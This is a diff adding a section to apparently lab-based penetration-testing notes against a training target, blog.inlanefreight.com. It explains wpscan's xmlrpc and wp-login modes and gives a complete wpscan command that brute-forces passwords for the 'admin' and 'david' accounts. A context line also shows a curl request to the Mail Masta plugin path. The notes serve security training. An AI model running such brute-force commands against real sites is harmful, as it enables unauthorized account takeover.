@@ -294,5 +294,13 @@ curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/co
 
 ![](Images/Pasted%20image%2020240312165722.png)
 
+## Attacking WordPress Users
 
+wpscan can also bruteforce usernames and passwords, and it uses two kinds of login attacks `xmlrpc` and `wp-login`   
+`wp-login` will try with the normal wordpress login page and `xmlrpc` will use the wordpress API to make login attempts through `/xmlrpc.php`   
+the `xml-rpc` method is preferred because it is faster 
+
+```shell
+wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
+```
 
